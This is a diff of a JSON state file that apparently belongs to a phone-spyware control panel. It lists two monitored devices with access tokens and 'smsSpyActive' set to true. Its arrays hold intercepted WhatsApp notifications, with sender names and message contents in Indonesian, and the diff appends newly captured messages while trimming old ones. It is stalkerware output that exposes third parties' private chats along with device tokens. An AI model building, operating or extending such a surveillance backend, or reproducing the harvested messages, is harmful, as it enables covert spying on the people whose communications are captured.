@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775045317427,
+    "lastSeen": 1775045320433,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13412 pesan): ~ Bot",
+        "content": "💟 Stiker",
+        "time": "01/04 20:08",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045320900
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13411 pesan): ~ Dapa",
+        "content": ".brat jangan ganggu, lagi main epep",
+        "time": "01/04 20:08",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045319394
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎7Sex Message (3 pesan): ~ Call Me Zal7Sex",
@@ -4003,22 +4019,6 @@
         "time": "01/04 19:59",
         "pkg": "com.whatsapp",
         "receivedAt": 1775044799255
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13260 pesan): ~ Fegg",
-        "content": "dei lah dei",
-        "time": "01/04 19:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044795555
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15521 pesan dari 10 chat",
-        "time": "01/04 19:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044795530
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775045315961,
+    "lastSeen": 1775045318944,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13411 pesan): ~ Dapa",
+        "content": ".brat jangan ganggu, lagi main epep",
+        "time": "01/04 20:08",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045319204
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎7Sex Message (3 pesan): ~ Call Me Zal7Sex",
@@ -8056,14 +8064,6 @@
         "time": "01/04 19:59",
         "pkg": "com.whatsapp",
         "receivedAt": 1775044795602
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13260 pesan): ~ Fegg",
-        "content": "dei lah dei",
-        "time": "01/04 19:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044795591
       }
     ],
     "galleryPhotos": [],
